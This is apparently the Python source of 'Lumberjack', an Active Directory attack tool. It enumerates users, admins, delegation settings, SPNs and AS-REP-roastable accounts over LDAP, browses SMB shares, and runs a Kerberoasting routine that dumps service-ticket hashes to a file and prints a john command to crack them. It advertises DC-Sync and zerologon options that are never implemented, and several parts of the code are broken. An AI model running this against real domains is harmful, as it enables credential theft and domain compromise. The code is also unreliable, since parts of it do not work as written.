#!/usr/bin/python3
# -*- coding: utf-8 -*-
try:
	#module imports
	import argparse, re, sys, textwrap, socket, random, threading, json, os, ldapdomaindump

	#other imports
	from datetime import datetime, timedelta
	from pprint import pprint
	from ldap3 import Server, Connection, ALL, SUBTREE, ALL_ATTRIBUTES, ServerPool
	from ldap3.core.exceptions import LDAPBindError, LDAPException
	from time import sleep
	from getpass import getpass
	from rich.console import Console
	from termcolor import colored, cprint
	from rich.console import Theme
	from impacket.krb5 import constants
	from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP, seq_set, seq_set_iter
	from impacket.krb5.kerberosv5 import sendReceive, KerberosError
	from impacket.krb5.types import KerberosTime, Principal
	from impacket.examples.ntlmrelayx.attacks.ldapattack import LDAPAttack
	from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
	from impacket.dcerpc.v5 import nrpc, epm
	from impacket.smbconnection import SessionError
	from netaddr import *
	from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
	from impacket.ntlm import compute_lmhash, compute_nthash
	from impacket.krb5.asn1 import TGS_REP
	from impacket.nmb import NetBIOSTimeout, NetBIOSError	
	from impacket.dcerpc.v5 import transport
	from impacket import smbconnection
	from pyasn1.codec.der import decoder, encoder
	from pyasn1.type.univ import noValue
	from Cryptodome.Cipher import AES
	from dns.resolver import NXDOMAIN
	from pyfiglet import Figlet
	from binascii import hexlify, unhexlify
	from subprocess import check_call
except Exception as e:
    	print ("Error {}".format(e))

"""
lumberjack.py
"""

custom_theme = Theme({"success": "cyan", "error": "red", "warning": "yellow", "status": "green", "info": "purple"})
console = Console(theme=custom_theme)
LDAP_BASE_DN = 'DC=hacklabtest,DC=local'

# Give up brute-forcing after 2000 attempts.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

#Enumeration Class
class EnumerateAD(object):

	def __init__(self, domainController, ldaps, ldap, verbose, ip_address, connect, smb, kerberoast, fuzz, status, username, password):
		
		if domainController:
			self.dc = domainController
		else: 
			self.getDCName()
		
		if ip_address:
			self.dIP = ip_address
		else:
			self.getDC_IP(domainController)

		self.dUser = username
		self.dPassword = password
		self.kerberoast = kerberoast
		self.ldaps = ldaps
		self.ldap = ldap
		self.status = status
		self.verbose = verbose
		self.fuzz = fuzz
		self.smb = smb
		self.structure = domainController.split('.')
		self.dc_search=''
		for element in self.structure:
			#splits domain name for object search. E.g DN goes from hacklab.local to 'dc=hacklab,dc=local'
			self.dc_search += 'dc={},'.format(element)
		self.computers = []
		self.spn = []       
	
	#Connect to domain
	def connect(self):
		
		self.status.update(status="[bold white]Connecting to Active Directory...")
		try:
			#Connect through LDAPS (Secure)
			if self.ldaps:
				self.server_pool = ServerPool(self.dIP)
				self.server = Server(self.dc, port=646, use_ssl=True, get_info=ALL)
				self.server_pool.add(self.server)
				self.conn = Connection(self.server_pool, user=self.dUser, password=self.dPassword, fast_decoder=True, auto_bind=True,
							auto_referrals=True, check_names=False, read_only=True, lazy=False, raise_exceptions=False)
				self.conn.open()
				self.conn.bind()
				console.print("[+] Success: Connected to Active Directory through LDAPs", style = "success")
			#Connect through LDAP
			elif self.ldap:
				self.server_pool = ServerPool(self.dIP)
				self.server = Server(self.dc, get_info=ALL)
				self.server_pool.add(self.server)
				self.conn = Connection(self.server_pool, self.dUser, password=self.dPassword, auto_bind=True, auto_referrals = False, fast_decoder=True)
				self.conn.open()
				self.conn.bind()
				console.print("[+] Success: Connected to Active Directory through LDAP", style = "success")			
			else:
				sleep(1)
				console.print ("[-] Error: Failed to connect: ", style = "error")
				raise LDAPBindError	
		except Exception as e:
			console.print ("[-] Error: Failed to connect: {} ".format(e), style = "error")
			raise LDAPBindError
		
	# Get the IP address of the domain controller		
	def getDC_IP(self, domainController):		

		try:
			ip_address = socket.gethostbyname(domainController)
			console.print("[+] Success: IP address of the domain is {}".format(ip_address))
		except:
			console.print("[-] Error: Unable to locate IP Address of Domain Controller through host lookup. Please try again", style = "error")            			
			sys.exit(1)

		self.dIP = ip_address
	
	# Get the IP address of the domain name		
	def getDCName(self):		
		try:
			domainController = socket.gethostname()
			console.print("[+] Success: Domain Name is {}".format(domainController))
		except:
			console.print("[-] Error: Unable to locate Domain Name through host lookup. Please try again", style = "error")            			
			sys.exit(1)

		self.dc = domainController
		
	#Enumerate Active Directory Users		
	def enumerateUsers(self):
		
		try:			
			self.status.update("[bold white]Finding Active Directory Users...")
			sleep(1)
			console.rule("[bold red]Domain Users")
			#Search AD Users (Verbose)
			if self.verbose:
				self.total_entries = 0
				self.entry_generator = self.conn.extend.standard.paged_search(self.dc_search[:-1], search_filter='(objectCategory=person)', attributes=ALL_ATTRIBUTES, size_limit=0)
				for entry in self.entry_generator:
					self.total_entries += 1
					pprint(usernames)
				console.print ("[+] Success: Got all domain users ", style = "success")
				print('')
				console.print('[-] Found {0} user account(s)'.format(len(self.total_entries)), style = "info")
			else:
				self.total_entries = 0
				self.entry_generator = self.conn.extend.standard.paged_search(self.dc_search[:-1], search_filter='(objectCategory=person)', size_limit=0)
				for entry in self.entry_generator:
					self.total_entries += 1
					pprint (entry)

				console.print("[+] Success: Got all domain users ", style = "success")
				print('')
				console.print("[-] Found {0} domain users".format((self.total_entries)), style = "info")
				print('')
				
		except LDAPException as e:
			console.print ("[-] Warning: No Users found", style = "warning")
			pprint ("Error {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find Computers?", style = "status")
			input("")
			EnumerateAD.enumComputers(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)

	#Enumerate Active Directory Computers		
	def enumComputers(self):
		
		try:	
			computerObjects = []
			self.status.update("[bold white]Finding Active Directory Computers...")
			sleep(1)
			console.rule("[bold red]Domain Computers")
			#Search AD Computers
			self.conn.search(self.dc_search[:-1], search_filter='(&(objectCategory=computer)(objectClass=computer))', attributes=['dnshostname'], size_limit=0)
			for entry in self.conn.entries:
				name = entry["dnshostname"][0]
				computerObjects.append({
					"Computer": name,
				})
				pprint (computerObjects)
				self.computers.append(entry)
				print('')
				console.print ("[+] Success: Got all domain computers ", style = "success")
				print('')
				console.print('[-] Found {0} computers'.format(len(self.conn.entries)), style = "info")
				print('')
			if self.smb:
				self.smbShareCandidates = []
				self.smbBrowseable = {}
				self.sortComputers()
				self.enumSMB()
			else:
				try:
					self.status.update("[bold white]Waiting...")
					console.print ("[-] Find Groups?", style = "status")
					input("")
					EnumerateAD.enumerateGroups(self)
				except KeyboardInterrupt:
					self.conn.unbind()
					console.print ("[-] Warning: Aborted", style = "warning")
					sys.exit(1)
					
		except LDAPException as e:
			console.print ("[-] Warning: No Computers found", style = "warning")
			pprint ("Error {}".format(e))
			sys.exit(1)
		
	#Enumerate Active Directory Groups			
	def enumerateGroups(self):
		
		try:
			groupobj = []
			self.status.update("[bold white]Finding Active Directory Groups...")
			sleep(1)
			console.rule("[bold red]Domain Groups")
			#Search AD Group
			self.conn.search(self.dc_search[:-1], search_filter='(objectCategory=group)', attributes=['distinguishedName', 'cn'], size_limit=0)
			for entry in self.conn.entries:
				name = entry["distinguishedName"][0]
				groupobj.append({
					"Group": name,
				})
			pprint (groupobj)
			console.print ("[+] Success: Got all groups ", style = "success")
			print('')
			console.print('[-] Found {0} groups'.format(len(self.conn.entries)), style = "info")
		except LDAPException as e:
			console.print ("[-] Warning: No Groups found", style = "warning")
			pprint ("Error {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find Organisational Units?", style = "status")
			input("")
			EnumerateAD.enumerateOUs(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)

	#Enumerate Organisational Units
	def enumerateOUs(self):
		
		try:
			ouObj = []
			self.status.update("[bold white]Finding Organisational Units...")
			sleep(1)
			console.rule("[bold red]Organisational Units")
			#Search AD Organisational Units
			self.conn.search(self.dc_search[:-1], search_filter='(objectclass=organizationalUnit)', attributes=['distinguishedName'], size_limit=0)
			for entry in self.conn.entries:
				name = entry["distinguishedName"][0]
				ouObj.append({
					"OU": name,
				})
			pprint (ouObj)
			console.print ("[+] Success: Got all OUs ", style = "success")
			print('')
			console.print('[-] Found {0} OUs'.format(len(self.conn.entries)), style = "info")
			print('')
		except LDAPException as e:
			console.print ("[-] Warning: No OUs found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find Admins?", style = "status")
			input("")
			EnumerateAD.search_admins(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)

	def search_admins(self):
		
		try:
			admin_users = []
			self.status.update("[bold white]Finding Admin Users...")
			sleep(1)
			console.rule("[bold red]Admin Users")
			self.conn.search(self.dc_search[:-1], '(&(adminCount=1)(objectclass=person))', attributes=['sAMAccountName', 'objectsid'], size_limit=0)
			for entry in self.conn.entries:
				name = entry["sAMAccountName"][0]
				sid = entry["objectSid"][0]
				admin_users.append({
					"Admin user": name,
				})
			pprint (admin_users)
			console.print ("[+] Success: Got all Admins ", style = "success")
			if len(admin_users) >= 1:
				print ('')
				console.print ("[!] Vulnerability: Domain has too many admin accounts ", style = "error")
			print('')
			console.print('[-] Found {0} Admins'.format(len(self.conn.entries)), style = "info")
			print('')
		except LDAPException as e:
			console.print ("[-] Warning: No Admins found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find Users with Unconstrained Delegation?", style = "status")
			input("")
			EnumerateAD.unconstrainedDelegation(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)
			
	#Enumerate accounts trusted for delegation (unconstrained delegation)					
	def unconstrainedDelegation(self):
		
		try:	
			unconstrained = []
			self.status.update("[bold white]Finding Users with unconstrained delegation...")
			sleep(1)
			console.rule("[bold red]Unconstrained Delegation")
			self.conn.search(self.dc_search[:-1], search_filter='(userAccountControl:1.2.840.113556.1.4.803:=524288)', attributes=["sAMAccountName"],  size_limit=0)
			for entry in self.conn.entries:
				name = entry["sAMAccountName"][0]
				unconstrained.append({
					"Unconstrained Users": name,
				})
			pprint (unconstrained)
			if len(self.conn.entries) >= 1:
				print('')
				console.print ("[!] Vulnerability: Domain Vulnerable to unconstrained delegation", style = "error")
				print('')
			console.print('[-] Found {0} account(s) with unconstrained delegation'.format(len(self.conn.entries)), style = "info")
			print('')
		except LDAPException as e:   
			console.print ("[-] Warning: No affected users found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)  
		try:
			console.print ("[-] Enumerate SPNs?", style = "status")
			input("")
			EnumerateAD.enumSPNs(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)	
						
	#Enumerate SPNs
	def enumSPNs(self):
	
		try:	
			self.status.update("[bold white]Enumerating SPNs...")
			sleep(1)
			console.rule("[bold red]SPN Accounts")
			self.filter = "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"
			self.conn.search(self.dc_search[:-1], search_filter=self.filter, attributes=['userPrincipalName', 'servicePrincipalName'], size_limit=0)
			pprint(self.conn.entries)  
			for entry in self.conn.entries:
				self.spn.append(entry)
			console.print ("[+] Success: Got all SPNs ", style = "success")
			print('')
			console.print('[-] Found {0} SPN Account(s)'.format(len(self.conn.entries)), style = "info")
			print('')
			if self.kerberoast:
				EnumerateAD.kerberoast(self)
			else:
				pass
		except LDAPException as e:   
			console.print ("[-] Warning: No affected users found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)  
		try:
			console.print ("[-] Enumerate AS-REP Roastable Users?", style = "status")
			input("")
			EnumerateAD.enumKerbPreAuth(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")

	def enumKerbPreAuth(self):
		
		asRepObj = []
		self.status.update("[bold white]Finding Users that dont require Kerberos Pre-Authentication...")
		# Build user array
		users = []
		console.rule("[bold red]AS-REP Roastable Users")
		self.conn.search(self.dc_search[:-1], search_filter='(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', 
				attributes=["cn", "objectSid", "sAMAccountName"], search_scope=SUBTREE)
		for entry in self.conn.entries:
			name = entry["sAMAccountName"][0]
			asRepObj.append({
				"AS-REP Roastable Users": name,
			})
			pprint (asRepObj)
			users.append(str(entry['sAMAccountName']) + '@{0}'.format(self.dc))
		if len(self.conn.entries) >= 1:
			console.print ("[!] Vulnerability: Domain users vulnerable to AS-REP Roasting", style = "error")
			print('')
		console.print('[-] Found {0} account(s) that dont require pre-authentication'.format(len(self.conn.entries)), style = "info")
		print('')
		
	#Fuzz AD with ANR (Ambiguous Name Resolution)
	def searchRandom(self, fobject, objectCategory=''):
		self.status.update("[bold white]Fuzzing Active Directory for: '{}'".format(fobject))
		#console.print('[-] Found {0} user accounts'.format(len(self.conn.entries)), style = "info")
		sleep(1)
		if objectCategory:
			searchFilter = '(&(objectCategory={})(anr={}))'.format(objectCategory, fobject)
		else:
			searchFilter = '(anr={})'.format(fobject)
		try:	
			self.conn.search(self.dc_search[:-1], search_filter=searchFilter, search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
			console.print('[-] Found {0} objects'.format(len(self.conn.entries)), style = "info")
			pprint(self.conn.entries) 
		except LDAPException as e:   
			console.print ("[-] Warning Nothing found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)  
			
	def kerberoast(self):

		users_spn = {}
		user_tickets = {}

		userDomain = self.dUser.split('@')[1]

		idx = 0
		for entry in self.spn:
			# TODO: Consider a better name than spn since spn is referenced below. It's confusing.
			spn = json.loads(self.spn[idx].entry_to_json())
			users_spn[self.splitJsonArr(spn['attributes'].get('name'))] = self.splitJsonArr(spn['attributes'].get('servicePrincipalName')) 
			idx += 1    

		# Get TGT for the supplied user
		client = Principal(self.dUser, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
		try:
			# We need to take the domain from the user@domain since it *could* be a cross-domain user
			tgt, cipher, _, newSession = getKerberosTGT(client, '', userDomain, compute_lmhash(self.dPassword), compute_nthash(self.dPassword), None, kdcHost=None)

			TGT = {}
			TGT['KDC_REP'] = tgt
			TGT['cipher'] = cipher
			TGT['sessionKey'] = newSession

			for user, spns in users_spn.items():
				if isinstance(spns, list):
					# We only really need one to get a ticket
					spn = spns[0] # lgtm [py/multiple-definition]
				else:
					spn = spns
					try:
						# Get the TGS
						serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
						tgs, cipher, _, newSession = getKerberosTGS(serverName, userDomain, None, TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])
						# Decode the TGS
						decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
						# Get different encryption types
						if decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
							entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.rc4_hmac.value, user, decoded['ticket']['realm'],
							spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
							hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
							user_tickets[spn] = entry
						elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
							entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'],
							spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
							hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
							user_tickets[spn] = entry
						elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
							entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'],
							spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
							hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
							user_tickets[spn] = entry
						elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
							entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.des_cbc_md5.value, user, decoded['ticket']['realm'], 
							spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), 
							hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
							user_tickets[spn] = entry

					except KerberosError:
						# For now continue
						# TODO: Maybe look deeper into issue here
						continue

			if len(user_tickets.keys()) > 0:
				with open('{0}-spn-tickets'.format(self.dc), 'w') as f:
					for key, value in user_tickets.items():
						f.write('{0}:{1}\n'.format(key, value))
				if len(user_tickets.keys()) == 1:
					print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} ticket for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()), self.dc))
				else:
					print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} tickets for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()), self.dc))
			else:
				print('[ ' + colored('OK', 'green') +' ] Got {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))


		except KerberosError as err:
			print('[ ' + colored('ERROR', 'red') +' ] Kerberoasting failed with error: {0}'.format(err.getErrorString()[1]))


	def sortComputers(self):
		for computer in self.computers:
		    try:
		        self.smbShareCandidates.append(computer['dNSHostName'])
		    except LDAPKeyError:
		        # No dnsname registered
		        continue
		if len(self.smbShareCandidates) == 1:
			console.print("[+] Found {0} dnsname".format(len(self.smbShareCandidates)), style="info")
		else:
			console.print("[+] Found {0} dnsname".format(len(self.smbShareCandidates)), style="info")

	def enumSMB(self):
	      
		try:
			for dnsname in self.smbShareCandidates:
				try:
					# Changing default timeout as shares should respond withing 5 seconds if there is a share
					# and ACLs make it available to self.user with self.passwd
					smbconn = smbconnection.SMBConnection('\\\\' + str(dnsname), str(dnsname), timeout=5)
					smbconn.login(self.dUser, self.dPassword)
					dirs = smbconn.listShares()
					self.smbBrowseable[str(dnsname)] = {}
					for share in dirs:
						self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = ''
						try:
							_ = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
							self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = True
						except (SessionError, UnicodeEncodeError, NetBIOSError):
							continue
					smbconn.logoff()
				except (socket.error, NetBIOSTimeout, SessionError, NetBIOSError):
				    continue
		except ValueError:
		    	pass
		print('')
		availDirs = []
		for key, value in self.smbBrowseable.items():
		    for _, v in value.items():
		        if v:
		            availDirs.append(key)

		if len(self.smbShareCandidates) == 1:
			console.print("[+] Searched {0} share and {1} with {2} subdirectories/files is browsable by {3}".format(len(self.smbShareCandidates), len(self.smbBrowseable.keys()), len(availDirs), self.dUser), style = "info")
		else:
			console.print("[+] Searched {0} share and {1} with {2} subdirectories/files is browsable by {3}".format(len(self.smbShareCandidates), len(self.smbBrowseable.keys()), len(availDirs), self.dUser), style = "info")
		if len(self.smbBrowseable.keys()) > 0:
		    with open('{0}-open-smb.json'.format(self.dc), 'w') as f:
		        json.dump(self.smbBrowseable, f, indent=4, sort_keys=False)
		    print('[ ' + colored('OK', 'green') + ' ] Wrote browseable shares to {0}-open-smb.json'.format(self.dc))
		
def titleArt():
	f = Figlet(font="slant")
	cprint(colored(f.renderText('Lumberjack'), 'cyan'))

def main():

	parser = argparse.ArgumentParser(prog='Lumberjack', add_help=False, formatter_class=argparse.RawDescriptionHelpFormatter, description=textwrap.dedent('''
			 __                    __              _            __
			/ /   __  ______ ___  / /_  ___  _____(_)___ ______/ /__
		       / /   / / / / __ `__ \/ __ \/ _ \/ ___/ / __ `/ ___/ //_/
		      / /___/ /_/ / / / / / / /_/ /  __/ /  / / /_/ / /__/  ,<
		     /_____/\__,_/_/ /_/ /_/_.___/\___/_/__/ /\__,_/\___/_/|_|
							/___/
	                       __.                                   By Tom Gardner
	              ________/o |)
	             {_______{_rs|
	        
       A Prototype Active Directory Vulnerability Identification, Exploitation, & Reporting Tool
    |*------------------------------------------------------------------------------------------*|
   	 '''))

	#Required arguments
	parser.add_argument('-dc', type=str, help='Hostname of the Domain Controller')
	parser.add_argument('-ls', '--ldaps', help='Connect to domain through LDAPS (Secure)', action='store_true')
	parser.add_argument('-l', '--ldap', help='Connect to domain through LDAP', action='store_true')
	parser.add_argument('-u', '--username', type=str, help='Username of domain user. The username format must be `user@domain.org`')
	parser.add_argument('-p', '--password', type=str, help='User Password`')
	parser.add_argument('-h', '--help', help='show this help message and exit', action='help')
	parser.add_argument('-ip', '--ip_address', type=str, help='ip address of Active Directory')
	parser.add_argument('-en', '--enumerate', help='Enumerate Active Directory Objects', action='store_true')
	parser.add_argument('-c', '--connect', help='Just connect and nothing else', action='store_true')
	parser.add_argument('-n', '--netbios', type=str, help='NetBIOS name of Domain Controller')
	parser.add_argument('-v', '--verbose', action='store_true')
	parser.add_argument('-e', '--exploit', help='run exploit features: 1 = DC-Sync, 2 = zerologon')
	parser.add_argument('-smb', '--smb', help='enumerate SMB shares', action='store_true')
	parser.add_argument('-krb', help='kerberoasting', action='store_true')
	parser.add_argument('identity' , action='store_true', help='domain\\username:password, attacker account with write access to target computer properties (NetBIOS domain name must be used!)')

	parser.add_argument('-f', '--fuzz', type=str)
	args = parser.parse_args()
	
	#Display help page if no arguments are provided
	if len(sys.argv) < 2:
		console.print("[-] Warning: No Arguments Provided", style = "warning")
		parser.print_help()
		parser.exit(1)

	password = args.password
	
	if not password:
		status.update("[bold white]Waiting...")
		print("Enter a password:")
		password = getpass()
	
	if args.connect:
		args.enumerate = False
		args.fuzz = False
		args.exploit = False	
	elif args.enumerate:
		args.fuzz = False
		args.exploit = False
	elif args.fuzz:
		args.enumerate = False
		args.exploit = False
	elif args.exploit:
		args.enumerate = False
		args.fuzz = False
		
	# Regex for invalid domain name or invalid ip address format
	domainRE = re.compile(r'^(([a-zA-Z]{1})|([a-zA-Z]{1}[a-zA-Z]{1})|([a-zA-Z]{1}[0-9]{1})|([0-9]{1}[a-zA-Z]{1})|([a-zA-Z0-9][-_\.a-zA-Z0-9]{1,61}[a-zA-Z0-9]))\.([a-zA-Z]{2,13}|[a-zA-Z0-9-]{2,30}\.[a-zA-Z]{2,3})$')
	domainMatch = domainRE.findall(args.dc)

	ipRE = re.compile(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
	ipaddr = ipRE.findall(args.ip_address)

	pswdreg = "^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*#?&])[A-Za-z\d@$!#%*?&]{8,18}$"
	match_re = re.compile(pswdreg)
	pwdres = re.search(match_re, args.password)

	#if invalid domain name and ip address format
	if not domainMatch:
		console.print("[-] Error: {} is not a valid domain name'".format(args.dc), style = "error")
		sys.exit(1)
	if not ipaddr:
		console.print("[-] Error: {} is not a valid IP Address'".format(args.ip_address), style = "error")
		sys.exit(1)
	
	titleArt()
	console.print("[+] Success: Lumberjack Started", style="success")
	print('')	
	start_time = datetime.now()
	
	#Run main features
	try:
		enumAD = EnumerateAD(args.dc, args.ldaps, args.ldap, args.verbose, args.ip_address, args.connect, args.smb, args.krb, args.fuzz, status, args.username, password)
		enumAD.connect()
		if not pwdres:
			print('')
			console.print("[!] Vulnerability: Active Directory has a weak password policy", style = "error")
			print('')
		if args.enumerate is not False:
			status.update("[bold white]Waiting...")
			console.print ("[-] Enumerate Users?", style = "status")
			input("")
			enumAD.enumerateUsers()
		elif args.fuzz is not False:
			enumAD.searchRandom(args.fuzz)
		elif args.exploit == '1':
			enumAD.dcSync()
	except RuntimeError as e:
		pprint ("Error {}".format(e))
	except KeyboardInterrupt:
		console.print ("[-] Warning: Aborting", style = "warning")
			
	status.update("[bold white]Exiting Lumberjack...")
	sleep(1)
	elapsed = datetime.now() - start_time
	console.print(f"[-] Completed after {elapsed.total_seconds():.2f} seconds", style="warning")
	
	#print blank line
	pprint('')
	
if __name__ == "__main__":
	with console.status("[bold white]Starting Lumberjack...") as status:
		print('')
		try:
			sleep(1)
			main()
			console.print("[+] Success: Finished", style="success")	
		except KeyboardInterrupt:
			console.print ("[-] Warning: Aborted", style= "warning")
